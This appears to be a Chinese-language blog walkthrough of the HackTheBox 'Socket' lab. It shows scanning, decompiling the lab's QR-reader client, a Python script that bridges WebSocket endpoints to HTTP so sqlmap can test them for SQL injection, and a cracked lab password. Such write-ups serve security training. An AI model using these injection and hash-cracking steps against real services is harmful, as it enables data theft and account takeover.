@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Socket - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Socket - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/04/05/Socket-Boogipop/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-04T16:22:06.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/HackTheBox/">HackTheBox</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>5,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Socket</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680610476740-213af37f-4ac6-49d0-a4b9-6649f2f7a4ad.png#averageHue=%23181f2b&clientId=ub9307415-af9e-4&from=paste&height=499&id=ua8f42826&name=image.png&originHeight=624&originWidth=924&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143919&status=done&style=none&taskId=u8ba4547f-0499-4745-8ac7-0dca7eab3a5&title=&width=739.2" alt="image.png"></p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>考点：WebSocket SQL注入、Http转换、bash提权<br>其实这个靶场步骤很简单，感觉也挺好玩的</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 20:14 CST</span><br><span class="line">Nmap scan report for 10.10.11.206</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://qreader.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 50.12 seconds</span><br></pre></td></tr></table></figure>
+<p>其实信息搜集后发现就开了2个端口，一个web80端口一个ssh22端口<br>然后我们进入web界面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680623874537-013b0f59-0c0b-48fd-bce2-9f380793d470.png#averageHue=%23fefefe&clientId=u494a898d-3a41-4&from=paste&height=765&id=u842250b0&name=image.png&originHeight=956&originWidth=1927&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=155692&status=done&style=none&taskId=u21f5ff3f-af0c-4641-8a0f-9200d2dfd69&title=&width=1541.6" alt="image.png"><br>这是一个app网站，我们下载windows版本的exe文件，然后用<code>pyinstxtractor</code>给他反编译成pyc文件：<br><code>python3 pyinstxtractor.py qreader.exe</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680623953500-4b2dc5a1-f49a-404c-aab6-5a68a53cfed5.png#averageHue=%23282f3d&clientId=u494a898d-3a41-4&from=paste&height=820&id=u49ba790b&name=image.png&originHeight=1025&originWidth=2198&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104726&status=done&style=none&taskId=ub5e23344-0b0e-40d7-b819-fab6b3be669&title=&width=1758.4" alt="image.png"><br>茫茫人海中看到了今天的主角，我们接下来继续将pyc还原为py文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install uncompyle6</span><br><span class="line"></span><br><span class="line">uncompyle6 qreader.pyc &gt; qreader.py</span><br></pre></td></tr></table></figure>
+<p>这个工具只支持3.9.0版本的python，不支持3.1，所以我没办法用，我直接找了个在线网站</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> uic, QtGui</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">VERSION = <span class="string">&#x27;0.0.2&#x27;</span></span><br><span class="line">ws_host = <span class="string">&#x27;ws://ws.qreader.htb:5789&#x27;</span></span><br><span class="line">icon_path = <span class="string">&#x27;./icon.png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_env</span>():</span><br><span class="line">    <span class="keyword">global</span> tmp_file_name</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyGUI</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(MyGUI, self).__init__()</span><br><span class="line">        uic.loadUi(tmp_file_name, self)</span><br><span class="line">        self.show()</span><br><span class="line">        self.current_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.actionImport.triggered.connect(self.load_image)</span><br><span class="line">        self.actionSave.triggered.connect(self.save_image)</span><br><span class="line">        self.actionQuit.triggered.connect(self.quit_reader)</span><br><span class="line">        self.actionVersion.triggered.connect(self.version)</span><br><span class="line">        self.actionUpdate.triggered.connect(self.update)</span><br><span class="line">        self.pushButton.clicked.connect(self.read_code)</span><br><span class="line">        self.pushButton_2.clicked.connect(self.generate_code)</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setWindowIcon(QtGui.QIcon(icon_path))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">self</span>):</span><br><span class="line">        options = QFileDialog.Options()</span><br><span class="line">        (filename, _) = QFileDialog.getOpenFileName(self, <span class="string">&#x27;Open File&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;All Files (*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> filename != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            self.current_file = filename</span><br><span class="line">            pixmap = QtGui.QPixmap(self.current_file)</span><br><span class="line">            pixmap = pixmap.scaled(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">            self.label.setScaledContents(<span class="literal">True</span>)</span><br><span class="line">            self.label.setPixmap(pixmap)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_image</span>(<span class="params">self</span>):</span><br><span class="line">        options = QFileDialog.Options()</span><br><span class="line">        (filename, _) = QFileDialog.getSaveFileName(self, <span class="string">&#x27;Save File&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;PNG (*.png)&#x27;</span>, options, **(<span class="string">&#x27;options&#x27;</span>,))</span><br><span class="line">        <span class="keyword">if</span> filename != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            img = self.label.pixmap()</span><br><span class="line">            img.save(filename, <span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_code</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            img = cv2.imread(self.current_file)</span><br><span class="line">            detector = cv2.QRCodeDetector()</span><br><span class="line">            (data, bbox, straight_qrcode) = detector.detectAndDecode(img)</span><br><span class="line">            self.textEdit.setText(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.statusBar().showMessage(<span class="string">&#x27;[ERROR] No image is imported!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">self</span>):</span><br><span class="line">        qr = qrcode.QRCode(<span class="number">1</span>, qrcode.constants.ERROR_CORRECT_L, <span class="number">20</span>, <span class="number">2</span>, **(<span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error_correction&#x27;</span>, <span class="string">&#x27;box_size&#x27;</span>, <span class="string">&#x27;border&#x27;</span>))</span><br><span class="line">        qr.add_data(self.textEdit.toPlainText())</span><br><span class="line">        qr.make(<span class="literal">True</span>, **(<span class="string">&#x27;fit&#x27;</span>,))</span><br><span class="line">        img = qr.make_image(<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, **(<span class="string">&#x27;fill_color&#x27;</span>, <span class="string">&#x27;back_color&#x27;</span>))</span><br><span class="line">        img.save(<span class="string">&#x27;current.png&#x27;</span>)</span><br><span class="line">        pixmap = QtGui.QPixmap(<span class="string">&#x27;current.png&#x27;</span>)</span><br><span class="line">        pixmap = pixmap.scaled(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">        self.label.setScaledContents(<span class="literal">True</span>)</span><br><span class="line">        self.label.setPixmap(pixmap)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">quit_reader</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(tmp_file_name):</span><br><span class="line">            os.remove(tmp_file_name)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">version</span>(<span class="params">self</span>):</span><br><span class="line">        response = asyncio.run(ws_connect(ws_host + <span class="string">&#x27;/version&#x27;</span>, json.dumps(&#123;</span><br><span class="line">            <span class="string">&#x27;version&#x27;</span>: VERSION &#125;)))</span><br><span class="line">        data = json.loads(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">            version_info = data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">            msg = <span class="string">f&#x27;&#x27;&#x27;[INFO] You have version <span class="subst">&#123;version_info[<span class="string">&#x27;version&#x27;</span>]&#125;</span> which was released on <span class="subst">&#123;version_info[<span class="string">&#x27;released_date&#x27;</span>]&#125;</span>&#x27;&#x27;&#x27;</span></span><br><span class="line">            self.statusBar().showMessage(msg)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error = data[<span class="string">&#x27;error&#x27;</span>]</span><br><span class="line">            self.statusBar().showMessage(error)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        response = asyncio.run(ws_connect(ws_host + <span class="string">&#x27;/update&#x27;</span>, json.dumps(&#123;</span><br><span class="line">            <span class="string">&#x27;version&#x27;</span>: VERSION &#125;)))</span><br><span class="line">        data = json.loads(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">            msg = <span class="string">&#x27;[INFO] &#x27;</span> + data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">            self.statusBar().showMessage(msg)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error = data[<span class="string">&#x27;error&#x27;</span>]</span><br><span class="line">            self.statusBar().showMessage(error)</span><br><span class="line"></span><br><span class="line">    __classcell__ = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ws_connect</span>(<span class="params">url, msg</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    (status, e) = setup_env()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> status:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Problem occured while setting up the env!&#x27;</span>)</span><br><span class="line">    app = QApplication([])</span><br><span class="line">    window = MyGUI()</span><br><span class="line">    app.exec_()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以发现这是一个websockets服务，其中开发了5789端口，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624151206-a660480c-6c5c-482d-9ef5-d5bd3722cae3.png#averageHue=%2353847d&clientId=u8b12b25a-26d3-4&from=paste&height=374&id=u4b547c9d&name=image.png&originHeight=467&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78269&status=done&style=none&taskId=u095ea6ed-9b72-4ae5-9934-0d914adcc0e&title=&width=934.4" alt="image.png"></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在update和version路由，我们都有可控参数，可以尝试是否存在SQL注入，经过fuzz测试可以发现存在union注入，这里提供了一种很棒的思路</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> TCPServer</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote, urlparse</span><br><span class="line"><span class="keyword">from</span> websocket <span class="keyword">import</span> create_connection</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#ws_server = &quot;ws://localhost:8156/ws&quot;</span></span><br><span class="line"><span class="comment">#ws_server = &quot;ws://qreader.htb:5789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送websocket的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ws</span>(<span class="params">payload,ws_server</span>):</span><br><span class="line">    <span class="comment">#创建一个websocket 连接句柄</span></span><br><span class="line">	ws = create_connection(ws_server)</span><br><span class="line">    </span><br><span class="line">	<span class="comment"># If the server returns a response on connect, use below line	</span></span><br><span class="line">	<span class="comment">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span></span><br><span class="line">	<span class="comment"># For our case, format the payload in JSON</span></span><br><span class="line">	<span class="comment">#message = unquote(payload[&quot;data&quot;]).replace(&#x27;&quot;&#x27;,&#x27;\&#x27;&#x27;) # replacing &quot; with &#x27; to avoid breaking JSON structure</span></span><br><span class="line">	</span><br><span class="line">	data =payload</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">type</span>(data))</span><br><span class="line">    <span class="comment"># 将字典dumps成一个字符串的格式</span></span><br><span class="line">	str_data = json.dumps(data)</span><br><span class="line">	<span class="built_in">print</span>((str_data))</span><br><span class="line">	ws.send(str_data)</span><br><span class="line">	resp = ws.recv()</span><br><span class="line">	<span class="built_in">print</span>(resp)</span><br><span class="line">	ws.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> resp:</span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">middleware_server</span>(<span class="params">host_port,content_type=<span class="string">&quot;text/plain&quot;</span></span>):</span><br><span class="line"></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">		<span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">			self.send_response(<span class="number">200</span>)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				payload = urlparse(self.path).query.split(<span class="string">&#x27;=&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">				key = urlparse(self.path).query.split(<span class="string">&#x27;=&#x27;</span>,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">				<span class="comment">#这里就是解释 key 和 value 放到一个字典中</span></span><br><span class="line">				data = &#123;key:payload&#125;</span><br><span class="line">				<span class="built_in">print</span>(urlparse(self.path).path)</span><br><span class="line">				<span class="built_in">print</span>(urlparse(self.path))</span><br><span class="line">				path = (urlparse(self.path).path)</span><br><span class="line">                <span class="comment">#socket靶机 开放websocket的端口</span></span><br><span class="line">				ws_server = <span class="string">&quot;ws://qreader.htb:5789&quot;</span></span><br><span class="line">				ws_server = ws_server +	path</span><br><span class="line">				<span class="built_in">print</span>(ws_server)</span><br><span class="line">			<span class="keyword">except</span> IndexError:</span><br><span class="line">				payload = <span class="literal">False</span></span><br><span class="line">				</span><br><span class="line">			<span class="keyword">if</span> payload:</span><br><span class="line">                <span class="comment">#将上面解析的 query 传给发送websocket请求的函数</span></span><br><span class="line">				content = send_ws(data,ws_server)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				content = <span class="string">&#x27;No parameters specified!&#x27;</span></span><br><span class="line"></span><br><span class="line">			self.send_header(<span class="string">&quot;Content-type&quot;</span>, content_type)</span><br><span class="line">			self.end_headers()</span><br><span class="line">			self.wfile.write(content.encode())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">_TCPServer</span>(<span class="title class_ inherited__">TCPServer</span>):</span><br><span class="line">		allow_reuse_address = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">	httpd = _TCPServer(host_port, CustomHandler)</span><br><span class="line">	httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting MiddleWare Server&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Send payloads in http://localhost:8082/?id=*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	middleware_server((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8082</span>))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过上述脚本，我们可以将websocket服务转换为http服务，然后再burp和sqlmap进行测试（由于我这里有校园网，所以拉一张网图，流量又太慢妈的）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624293471-adcd88a2-0d23-4551-ae08-894cd4f75bcc.png#averageHue=%23161616&clientId=u8b12b25a-26d3-4&from=paste&id=u27ba7ee2&name=image.png&originHeight=501&originWidth=1234&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=127192&status=done&style=none&taskId=u501659c1-f5d0-418f-85f4-8952fb7c7d4&title=" alt="image.png"><br>最后跑是可以跑出这样的东西的，然后md5可以在网站进行爆破解密，这里推荐个国外的<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624358679-e24097d7-77d8-45ea-9689-6d5bcc452e69.png#averageHue=%23eaeae9&clientId=u8b12b25a-26d3-4&from=paste&height=314&id=uc4f21667&name=image.png&originHeight=392&originWidth=1326&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29867&status=done&style=none&taskId=ud09326d0-70db-429f-9d76-12ba581b3c0&title=&width=1060.8" alt="image.png"><br><code>denjanjade122566</code>得到了密码，剩下的就是用户名了<br>在sqlmap进行爆破时，你也会看到这一张表<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680624407407-60b0ba2f-191e-490b-a99a-4dd0bd0f60da.png#averageHue=%231a1a1a&clientId=u8b12b25a-26d3-4&from=paste&id=ufd783b1e&name=image.png&originHeight=309&originWidth=1468&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=44074&status=done&style=none&taskId=u33daa152-b9c9-4979-bb29-33f9c19def4&title=" alt="image.png"></p>
